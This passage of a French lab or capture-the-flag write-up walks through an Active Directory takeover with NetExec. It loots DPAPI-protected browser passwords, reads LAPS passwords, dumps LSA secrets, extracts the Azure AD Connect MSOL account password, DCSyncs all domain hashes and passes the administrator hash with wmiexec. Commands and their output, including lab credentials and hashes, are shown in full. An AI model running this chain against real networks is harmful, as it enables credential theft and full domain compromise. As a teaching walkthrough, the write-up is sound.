<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>MSOL_80541c18ebaa             2024-07-02 21:25:11 0       Account created by Microsoft Azure Active Directory Connect with installation identifier 80541c18ebaa4ce0a259edbe39a92547 running on computer REFERENDUM configured to synchronize to tenant lehack275gmail.onmicrosoft.com. This account must have directory replication permissions in the local Active Directory and write permission on certain attributes to enable Hybrid Deployment.</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#66D9EF"><b>[*]</b></font> Enumerated 29 local users: ROME
<font color="#A6E22E">Running nxc against 4 targets</font> <font color="#729C1F">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</font> <font color="#AE81FF">100%</font> <font color="#A1EFE4">0:00:00</font>
</code></pre></div>
{{< /rawhtml >}}

L'utilisateur `MSOL_80541c18ebaa` ressort comme étant intéressant. On note pour plus tard cet utilisateur.

> MSOL_80541c18ebaa - Account created by Microsoft Azure Active Directory Connect with installation identifier 80541c18ebaa4ce0a259edbe39a92547 running on computer REFERENDUM configured to synchronize to tenant lehack275gmail.onmicrosoft.com. This account must have directory replication permissions in the local Active Directory and write permission on certain attributes to enable Hybrid Deployment.

## DPAPI

L'indice de `plans.txt` nous indique qu'il peut être intéressant de chercher si des traces sont restées sur les serveurs.

> J’ai aussi entendu dire que le capitaine Lapsus était passé dans le camp le mois dernier. J’espère qu’il n’a pas laissé de trace !

On peut utiliser __`--dpapi`__ pour récupérer les secrets protégés par la __DPAPI__, tels que les __mots de passe__ de __Chrome__.


{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF6AC1">❯</font> <font color="#A6E22E">nxc</font> smb <u style="text-decoration-style:single">ips.txt</u> -u musculus -H 0c5a8f7d371f7159fe673933401d0109 --dpapi
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:REFERENDUM) (domain:rome.local) (<font color="#F92672"><b>signing:False</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:METRONUM) (domain:rome.local) (<font color="#F92672"><b>signing:False</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:babaorum) (domain:rome.local) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:village) (domain:armorique.local) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#A6E22E"><b>[+]</b></font> rome.local\musculus:0c5a8f7d371f7159fe673933401d0109 
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#A6E22E"><b>[+]</b></font> rome.local\musculus:0c5a8f7d371f7159fe673933401d0109 <font color="#F4BF75"><b>(Pwn3d!)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#66D9EF"><b>[*]</b></font> Collecting User and Machine masterkeys, grab a coffee and be patient...
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.5        445    village          <font color="#F92672"><b>[-]</b></font> armorique.local\musculus:0c5a8f7d371f7159fe673933401d0109 STATUS_LOGON_FAILURE
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#A6E22E"><b>[+]</b></font> rome.local\musculus:0c5a8f7d371f7159fe673933401d0109 
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#A6E22E"><b>[+]</b></font> Got <font color="#F4BF75"><b>8</b></font> decrypted masterkeys. Looting secrets...
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.7        445    METRONUM         <font color="#F4BF75"><b>[musculus][GOOGLE CHROME] http://testphp.vulnweb.com/userinfo.php - lapsus:hC78*K,Zv+z123</b></font>
<font color="#A6E22E">Running nxc against 4 targets</font> <font color="#729C1F">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</font> <font color="#AE81FF">100%</font> <font color="#A1EFE4">0:00:00</font>
</code></pre></div>
{{< /rawhtml >}}

On trouve ainsi les __identifiants__ de `lapsus`:

    lapsus:hC78*K,Zv+z123


## LAPS

Le nom de l'utilisateur, *`lapsus`* nous met sur la voie. Il s'agit d'aller trouver les identifiants des administrateurs locaux, qui sont gérés par **LAPS**.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF6AC1">❯</font> <font color="#A6E22E">nxc</font> winrm <u style="text-decoration-style:single">ips.txt</u> -u <font color="#F4BF75">&apos;lapsus&apos;</font> -p <font color="#F4BF75">&apos;hC78*K,Zv+z123&apos;</font> --laps
<font color="#66D9EF"><b>WINRM</b></font>       10.0.0.5        5985   village          <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 (name:village) (domain:armorique.local)
<font color="#66D9EF"><b>WINRM</b></font>       10.0.0.7        5985   METRONUM         <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 (name:METRONUM) (domain:rome.local)
<font color="#66D9EF"><b>WINRM</b></font>       10.0.0.4        5985   babaorum         <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 (name:babaorum) (domain:rome.local)
<font color="#66D9EF"><b>WINRM</b></font>       10.0.0.8        5985   REFERENDUM       <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 (name:REFERENDUM) (domain:rome.local)
<font color="#66D9EF"><b>LDAP</b></font>        armorique.local 389    armorique.local  <font color="#F92672"><b>[-]</b></font> armorique.local\lapsus:hC78*K,Zv+z123 
<font color="#66D9EF"><b>LDAP</b></font>        10.0.0.5        389    village          <font color="#F92672"><b>[-]</b></font> LDAP connection failed with account lapsus
<font color="#66D9EF"><b>LDAP</b></font>        10.0.0.4        389    babaorum         <font color="#F92672"><b>[-]</b></font> msMCSAdmPwd or msLAPS-Password is empty or account cannot read LAPS property for babaorum
<font color="#66D9EF"><b>WINRM</b></font>       10.0.0.7        5985   METRONUM         <font color="#A6E22E"><b>[+]</b></font> METRONUM\admin01:),8z,)I-Wb6KPz <font color="#F4BF75"><b>(Pwn3d!)</b></font>
<font color="#66D9EF"><b>WINRM</b></font>       10.0.0.8        5985   REFERENDUM       <font color="#A6E22E"><b>[+]</b></font> REFERENDUM\admin01:{RT5Xv]Xh1Y34n <font color="#F4BF75"><b>(Pwn3d!)</b></font>
<font color="#A6E22E">Running nxc against 4 targets</font> <font color="#729C1F">━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</font> <font color="#AE81FF">100%</font> <font color="#A1EFE4">0:00:00</font>
</code></pre></div>
{{< /rawhtml >}}

Ces identifiants LAPS pour `admin01` nous donnent accès à 2 machines:

* *metronum*, dont nous avions déjà compromis avec `localix`
* __*referendum*__, sur lequel nous n'avons pas encore d'accès.

Comme il s'agit de mots de passe __locaux__, il faut préciser l'option __`--local-auth`__ à `nxc`.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF6AC1">❯</font> <font color="#A6E22E">nxc</font> winrm referendum -u admin01 -p <font color="#F4BF75">&apos;{RT5Xv]Xh1Y34n&apos;</font> --local-auth
<font color="#66D9EF"><b>WINRM</b></font>       10.0.0.8        5985   REFERENDUM       <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 (name:REFERENDUM) (domain:rome.local)
<font color="#66D9EF"><b>WINRM</b></font>       10.0.0.8        5985   REFERENDUM       <font color="#A6E22E"><b>[+]</b></font> REFERENDUM\admin01:{RT5Xv]Xh1Y34n <font color="#F4BF75"><b>(Pwn3d!)</b></font>
</code></pre></div>
{{< /rawhtml >}}


## Dumper LSASS.exe - Referendum

Ces identifiants d'administrateur nous permettent à nouveau de dumper `lsass.exe` et d'obtenir ainsi les hashs de mot de passe des utilisateurs locaux.
Pour varier on utilise cette fois l'option `--lsa`.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF6AC1">❯</font> <font color="#A6E22E">nxc</font> smb referendum -u admin01 -p <font color="#F4BF75">&apos;{RT5Xv]Xh1Y34n&apos;</font> --local-auth --lsa
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:REFERENDUM) (domain:REFERENDUM) (<font color="#F92672"><b>signing:False</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#A6E22E"><b>[+]</b></font> REFERENDUM\admin01:{RT5Xv]Xh1Y34n <font color="#F4BF75"><b>(Pwn3d!)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#A6E22E"><b>[+]</b></font> Dumping LSA secrets
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#F4BF75"><b>ROME.LOCAL/jules.cesar:$DCC2$10240#jules.cesar#f711dd6f946357d6c1bf844f78d2af32: (2024-07-02 20:27:52)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#F4BF75"><b>ROME.LOCAL/jules.cesar:$DCC2$10240#jules.cesar#f711dd6f946357d6c1bf844f78d2af32: (2024-07-03 20:45:34)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#F4BF75"><b>ROME.LOCAL/jules.cesar:$DCC2$10240#jules.cesar#f711dd6f946357d6c1bf844f78d2af32: (2024-07-03 20:49:31)</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#F4BF75"><b>ROME\REFERENDUM$:aes256-cts-hmac-sha1-96:eea4c7d88254cbf9877e12d799546d40842743dbe1e3f791d544c72c887acbeb</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#F4BF75"><b>ROME\REFERENDUM$:aes128-cts-hmac-sha1-96:4f07cd08acc91e045983fbd42c41d632</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#F4BF75"><b>ROME\REFERENDUM$:des-cbc-md5:6d349d46cdfd38b3</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#F4BF75"><b>ROME\REFERENDUM$:plain_password_hex:5b0057004800750033002c005d005f0040007900690026002e003b0074007a0037006b005500690069005800380041006b00670045006700670065002a002e006f005900410043006a005c0054006d0078004d006000720049002f0022005b00760024006e002e005b0068004e0054006f004100240077006a00660025005b0062004300720058002f004500460046006d003b005a003d002e0047002e003200330049002a0067005500670030006300790051003700200060005200280034007200200033002f00430050007300380038004a003800490039005d003f003b0068006f005b0060004b006d0033003200</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#F4BF75"><b>ROME\REFERENDUM$:aad3b435b51404eeaad3b435b51404ee:31c64d2a43a95066a3374da8a8e84320:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#F4BF75"><b>dpapi_machinekey:0xd285cc8e6b9b78f6afadc401ad63cd7c445f944b</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#F4BF75"><b>dpapi_userkey:0xf38a0989bfc901fb956115da6968af04dc8af614</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#F4BF75"><b>NL$KM:831e11da646a29901b2381dc73416771ffc6dcb9ee0a00bdffe43ea75dee52dff9a9361c6de385ce661161cfce0db3508bf5056abfbca761fd1fbc4a872eaf55</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#A6E22E"><b>[+]</b></font> Dumped <font color="#F4BF75"><b>10</b></font> LSA secrets to /home/olivier/.nxc/logs/REFERENDUM_10.0.0.8_2024-07-07_193918.secrets and /home/olivier/.nxc/logs/REFERENDUM_10.0.0.8_2024-07-07_193918.cached
</code></pre></div>
{{< /rawhtml >}}

Malheureusement, cela ne nous donne pas d'accès supplémentaires.

## MSOL

C'est le moment de revenir au compte `MSOL_80541c18ebaa` que nous avions identifié précédemment, dont voici la description.

> MSOL_80541c18ebaa - Account created by Microsoft Azure Active Directory Connect with installation identifier 80541c18ebaa4ce0a259edbe39a92547 __running on computer REFERENDUM__ configured to synchronize to tenant lehack275gmail.onmicrosoft.com. This account must __have directory replication permissions__ in __the local Active Directory__ and __write permission__ on certain attributes to enable Hybrid Deployment.

Si vous n'êtes, comme moi, pas familier avec les __comptes _MSOL___ (Microsoft Online Services). Sachez qu'il s'agit de comptes utilisés pour __synchroniser__ un __Active Directory__ et un __Azure Active Directory__.

Ainsi un utilisateur pour utiliser ses identifiants Active Directory sur Azure AD, et Office 365.  
Les comptes MSOL ont généralement des droits élevés pour synchroniser les utilisateurs, groupes, et autres objets du domaine. Plus d'information ici : [https://www.tevora.com/threat-blog/targeting-msol-accounts-to-compromise-internal-networks/](https://www.tevora.com/threat-blog/targeting-msol-accounts-to-compromise-internal-networks/).

Netexec a un __module__ qui permet d'__extraire__ les __identifiants MSOL__.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><font color="#FF6AC1">❯</font> nxc smb -L
<font color="#F4BF75"><b>LOW PRIVILEGE MODULES</b></font>
[...]

<font color="#F4BF75"><b>HIGH PRIVILEGE MODULES (requires admin privs)</b></font>
[...]
<font color="#66D9EF"><b>[*]</b></font> msol                      Dump MSOL cleartext password from the localDB on the Azure AD-Connect Server
[...]
</code></pre></div>
{{< /rawhtml >}}

Ce module nécessite les __privilèges administrateurs__, mais __LAPS__ nous a fourni les identifiants du compte __`admin01`__.

Comme indiqué dans sa description, le compte `MSOL_80541c18ebaa` est exécuté sur la machine `REFERENDUM`, et a des droits de réplication sur le DC `babaorum`.  
On utilise le module `msol` pour récupérer les identifiants du compte `MSOL_80541c18ebaa`.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF6AC1">❯</font> <font color="#A6E22E">nxc</font> smb referendum -u admin01 -p <font color="#F4BF75">&apos;{RT5Xv]Xh1Y34n&apos;</font> --local-auth -M msol  
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:REFERENDUM) (domain:REFERENDUM) (<font color="#F92672"><b>signing:False</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.8        445    REFERENDUM       <font color="#A6E22E"><b>[+]</b></font> REFERENDUM\admin01:{RT5Xv]Xh1Y34n <font color="#F4BF75"><b>(Pwn3d!)</b></font>
<font color="#A1EFE4"><b>MSOL</b></font>        10.0.0.8        445    REFERENDUM       <font color="#66D9EF"><b>[*]</b></font> Uploading msol.ps1
<font color="#A1EFE4"><b>MSOL</b></font>        10.0.0.8        445    REFERENDUM       <font color="#A6E22E"><b>[+]</b></font> Msol script successfully uploaded
<font color="#A1EFE4"><b>MSOL</b></font>        10.0.0.8        445    REFERENDUM       <font color="#66D9EF"><b>[*]</b></font> Executing the script
<font color="#A1EFE4"><b>MSOL</b></font>        10.0.0.8        445    REFERENDUM       <font color="#F4BF75"><b>[*] Querying ADSync localdb (mms_server_configuration)</b></font>
<font color="#A1EFE4"><b>MSOL</b></font>        10.0.0.8        445    REFERENDUM       <font color="#F4BF75"><b>[*] Querying ADSync localdb (mms_management_agent)</b></font>
<font color="#A1EFE4"><b>MSOL</b></font>        10.0.0.8        445    REFERENDUM       <font color="#F4BF75"><b>[*] Using xp_cmdshell to run some Powershell as the service user</b></font>
<font color="#A1EFE4"><b>MSOL</b></font>        10.0.0.8        445    REFERENDUM       <font color="#F4BF75"><b>Domain: ROME.LOCAL</b></font>
<font color="#A1EFE4"><b>MSOL</b></font>        10.0.0.8        445    REFERENDUM       <font color="#F4BF75"><b>Username: MSOL_80541c18ebaa</b></font>
<font color="#A1EFE4"><b>MSOL</b></font>        10.0.0.8        445    REFERENDUM       <font color="#F4BF75"><b>Password: ]x+qdDl^U!u2I=_wW&amp;1EdJ:*sA(APh_R-v?:#335PPD!Lf[_4ui[h)y&gt;sXB{&amp;[$|F+dHnUD2-]4#4ZNgX%dg?1F.B}h.Q)Kb#8(k^oZ_5:O3Aya}a*.2Bc_L;^q!{B%</b></font>
<font color="#A1EFE4"><b>MSOL</b></font>        10.0.0.8        445    REFERENDUM       <font color="#A6E22E"><b>[+]</b></font> Msol script successfully deleted
</code></pre></div>
{{< /rawhtml >}}

On obtient les identifiants suivants:

    MSOL_80541c18ebaa:]x+qdDl^U!u2I=_wW&1EdJ:*sA(APh_R-v?:#335PPD!Lf[_4ui[h)y>sXB{&[$|F+dHnUD2-]4#4ZNgX%dg?1F.B}h.Q)Kb#8(k^oZ_5:O3Aya}a*.2Bc_L;^q!{B%

## DCSync - Babaorum

Comme expliqué par _mpgn_ lors du workshop. Quand vous voyez **MSOL**, pensez tout de suite **DCSync**.
On a vu précédemment que le compte `MSOL` avait des droits de réplication sur le Domaine.

On va récupérer le `ntds.dit` avec un **DCSync**, et donc l'ensemble des hashs de mots de passe des utilisateurs du domaine.

{{< rawhtml >}}
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code style="background-color:initial;"><font color="#FF6AC1">❯</font> <font color="#A6E22E">nxc</font> smb babaorum -u MSOL_80541c18ebaa -p <font color="#F4BF75">&apos;]x+qdDl^U!u2I=_wW&amp;1EdJ:*sA(APh_R-v?:#335PPD!Lf[_4ui[h)y&gt;sXB{&amp;[$|F+dHnUD2-]4#4ZNgX%dg?1F.B}h.Q)Kb#8(k^oZ_5:O3Aya}a*.2Bc_L;^q!{B%&apos;</font> --ntds                   
<font color="#F92672"><b>[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user &lt;user&gt; to dump a specific user safely or the module -M ntdsutil [Y/n] </b></font>y
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#66D9EF"><b>[*]</b></font> Windows 10 / Server 2019 Build 17763 x64 (name:babaorum) (domain:rome.local) (<font color="#A6E22E"><b>signing:True</b></font>) (<font color="#A1EFE4"><b>SMBv1:False</b></font>)
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#A6E22E"><b>[+]</b></font> rome.local\MSOL_80541c18ebaa:]x+qdDl^U!u2I=_wW&amp;1EdJ:*sA(APh_R-v?:#335PPD!Lf[_4ui[h)y&gt;sXB{&amp;[$|F+dHnUD2-]4#4ZNgX%dg?1F.B}h.Q)Kb#8(k^oZ_5:O3Aya}a*.2Bc_L;^q!{B%
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F92672"><b>[-]</b></font> RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#A6E22E"><b>[+]</b></font> Dumping the NTDS, this could take a while so go grab a redbull...
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>jules.cesar:500:aad3b435b51404eeaad3b435b51404ee:6beba33d18f9e0eba5c8080f362b7f76:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:84da2d0c46d27cd7ef52f4498a8f1933:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>rome.local\brutus:1103:aad3b435b51404eeaad3b435b51404ee:5160cc29facd160087422320c7fd082e:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>rome.local\caius.bonus:1104:aad3b435b51404eeaad3b435b51404ee:ead20c9e1a5879c1a5e667805f01b210:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>rome.local\caius.laius:1105:aad3b435b51404eeaad3b435b51404ee:863937c2368fca626d494154969fa3f1:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>rome.local\caius.pupus:1106:aad3b435b51404eeaad3b435b51404ee:485f0a1259fca7feedc4ed446cd73f51:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>rome.local\motus:1107:aad3b435b51404eeaad3b435b51404ee:a18173360503e5d7a9896e77237cbebf:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>rome.local\couverdepus:1108:aad3b435b51404eeaad3b435b51404ee:daed649b85afad70575c3ce846f3d8b6:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>rome.local\processus:1109:aad3b435b51404eeaad3b435b51404ee:6e63bdf716e7e8ea38bb16a7fd03558d:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>rome.local\cartapus:1110:aad3b435b51404eeaad3b435b51404ee:e9d56f8b7255cd0bf70505eb3070ca88:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>rome.local\oursenplus:1111:aad3b435b51404eeaad3b435b51404ee:91baa4580b05f821e392ea7c436bbd91:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>rome.local\detritus:1112:aad3b435b51404eeaad3b435b51404ee:be8e40a630e541e24a03311349cb291a:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>rome.local\blocus:1113:aad3b435b51404eeaad3b435b51404ee:ac7121d5b6f0af7cf020a347a51bb698:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>rome.local\musculus:1114:aad3b435b51404eeaad3b435b51404ee:0c5a8f7d371f7159fe673933401d0109:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>rome.local\radius:1115:aad3b435b51404eeaad3b435b51404ee:bc26132bc86bab561351244c959c4e61:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>rome.local\briseradius:1116:aad3b435b51404eeaad3b435b51404ee:5a8630be79b7da10099b001a5adee00e:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>rome.local\plexus:1117:aad3b435b51404eeaad3b435b51404ee:b5afa6f98a1ca2ee9b43645dae87f741:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>rome.local\marcus.sacapus:1118:aad3b435b51404eeaad3b435b51404ee:40bc830efe84caaacbc58262bd5a3ace:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>rome.local\yenapus:1119:aad3b435b51404eeaad3b435b51404ee:35908c42619644b303e417ecc3f2366a:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>rome.local\chorus:1120:aad3b435b51404eeaad3b435b51404ee:16ee2fbf32a9f5800d70070cd5e5b66a:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>rome.local\cleopatre:1121:aad3b435b51404eeaad3b435b51404ee:7397391ffb9e81939e76a830019e0b62:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>rome.local\epidemais:1122:aad3b435b51404eeaad3b435b51404ee:dda224f756b385f1ef02924cb0df1adb:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>rome.local\numerobis:1123:aad3b435b51404eeaad3b435b51404ee:808022bae08938c2a345f3dec9d38277:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>rome.local\amonbofis:1124:aad3b435b51404eeaad3b435b51404ee:c4efae63bf2f5b7af768e12cc749ba88:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>rome.local\tournevis:1125:aad3b435b51404eeaad3b435b51404ee:b2b47a85455927d48417b848763bf37d:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>rome.local\tumeheris:1126:aad3b435b51404eeaad3b435b51404ee:a7f58eb584616d3f90d7096d52fd5259:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>rome.local\lapsus:1128:aad3b435b51404eeaad3b435b51404ee:3b235a452fe0fb3c119cbc2087203c08:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>MSOL_80541c18ebaa:2101:aad3b435b51404eeaad3b435b51404ee:eb0be077df394d2c9b8cf4e53496b888:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>babaorum$:1000:aad3b435b51404eeaad3b435b51404ee:a210e3719c40b9209b8a071d0173c5b8:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>METRONUM$:1127:aad3b435b51404eeaad3b435b51404ee:0b9c62acf7e9754d98013f89d3ffdf4a:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#F4BF75"><b>REFERENDUM$:1129:aad3b435b51404eeaad3b435b51404ee:31c64d2a43a95066a3374da8a8e84320:::</b></font>
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#A6E22E"><b>[+]</b></font> Dumped <font color="#F4BF75"><b>32</b></font> NTDS hashes to /home/olivier/.nxc/logs/babaorum_10.0.0.4_2024-07-07_195642.ntds of which <font color="#F4BF75"><b>29</b></font> were added to the database
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#66D9EF"><b>[*]</b></font> To extract only enabled accounts from the output file, run the following command:
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#66D9EF"><b>[*]</b></font> cat /home/olivier/.nxc/logs/babaorum_10.0.0.4_2024-07-07_195642.ntds | grep -iv disabled | cut -d &apos;:&apos; -f1
<font color="#66D9EF"><b>SMB</b></font>         10.0.0.4        445    babaorum         <font color="#66D9EF"><b>[*]</b></font> grep -iv disabled /home/olivier/.nxc/logs/babaorum_10.0.0.4_2024-07-07_195642.ntds | cut -d &apos;:&apos; -f1
</code></pre></div>
{{< /rawhtml >}}

À ce stade, nous sommes __administrateur__ du __domaine__ `rome.local`.

On identifie avec le _SID_ `500` que __`jules.cesar`__ est admin du domaine `rome.local`. On peut utiliser son _hash_ pour se connecter.

```shell
❯ wmiexec.py jules.cesar@babaorum -hashes :6beba33d18f9e0eba5c8080f362b7f76       
Impacket v0.11.0 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
rome\jules.cesar

C:\>net user jules.cesar
User name                    jules.cesar
Full Name                    
Comment                      Built-in account for administering the computer/domain
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            7/1/2024 1:25:07 PM
Password expires             8/12/2024 1:25:07 PM
Password changeable          7/2/2024 1:25:07 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
